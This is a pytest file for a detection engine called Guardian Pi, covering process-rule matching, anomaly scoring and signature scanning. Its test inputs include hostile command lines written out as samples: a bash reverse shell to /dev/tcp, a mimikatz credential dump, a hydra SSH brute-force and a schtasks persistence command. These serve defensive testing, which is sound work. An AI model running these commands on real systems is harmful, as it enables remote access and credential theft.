"""
Guardian Pi — Detection Engine Tests
"""
import pytest
from backend.app.services.detection_service import detection_engine


class TestSigmaMatching:
    """Test Sigma-style rule matching against process data."""

    def test_mimikatz_detection(self):
        matches = detection_engine.match_process("mimikatz.exe", "mimikatz sekurlsa::logonpasswords")
        assert len(matches) >= 1
        assert any(m["rule_id"] == "SIGMA-001" for m in matches)
        assert matches[0]["severity"] == "critical"

    def test_hydra_detection(self):
        matches = detection_engine.match_process("hydra", "hydra -l admin -P wordlist.txt ssh://10.0.0.1")
        assert len(matches) >= 1
        assert any(m["category"] == "credential_access" for m in matches)

    def test_reverse_shell_detection(self):
        matches = detection_engine.match_process("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert len(matches) >= 1
        assert matches[0]["severity"] == "critical"

    def test_encoded_powershell_detection(self):
        matches = detection_engine.match_process("powershell.exe", "powershell.exe -EncodedCommand ZQBjAGgAbwA=")
        assert len(matches) >= 1
        assert matches[0]["mitre_technique"] == "T1027"

    def test_normal_process_no_match(self):
        matches = detection_engine.match_process("notepad.exe", "notepad.exe readme.txt")
        assert len(matches) == 0

    def test_debugger_detection(self):
        matches = detection_engine.match_process("gdb", "gdb ./program")
        assert len(matches) >= 1
        assert any(m["category"] == "defense_evasion" for m in matches)

    def test_persistence_detection(self):
        matches = detection_engine.match_process("schtasks.exe", "schtasks /create /tn malware /tr evil.exe")
        assert len(matches) >= 1


class TestAnomalyScoring:
    """Test heuristic anomaly scoring."""

    def test_normal_metrics(self):
        result = detection_engine.calculate_anomaly_score({
            "cpu_percent": 30, "ram_percent": 50, "active_connections": 20, "process_count": 100,
        })
        assert result["anomaly_score"] < 20
        assert result["risk_level"] == "low"

    def test_high_cpu_scores(self):
        result = detection_engine.calculate_anomaly_score({
            "cpu_percent": 96, "ram_percent": 50, "active_connections": 20, "process_count": 100,
        })
        assert result["anomaly_score"] >= 30
        assert len(result["reasons"]) > 0

    def test_critical_metrics(self):
        result = detection_engine.calculate_anomaly_score({
            "cpu_percent": 98, "ram_percent": 97, "active_connections": 600, "process_count": 600,
        })
        assert result["anomaly_score"] >= 60
        assert result["risk_level"] in ("critical", "high")


class TestYARAScanning:
    """Test YARA-style signature scanning."""

    def test_detect_mimikatz_string(self):
        content = b"some binary content gentilkiwi more binary"
        matches = detection_engine.scan_file_content(content, "suspicious.exe")
        assert len(matches) >= 1
        assert matches[0]["signature"] == "mimikatz_string"

    def test_clean_file(self):
        content = b"This is a perfectly normal file with no malicious content."
        matches = detection_engine.scan_file_content(content, "normal.txt")
        assert len(matches) == 0
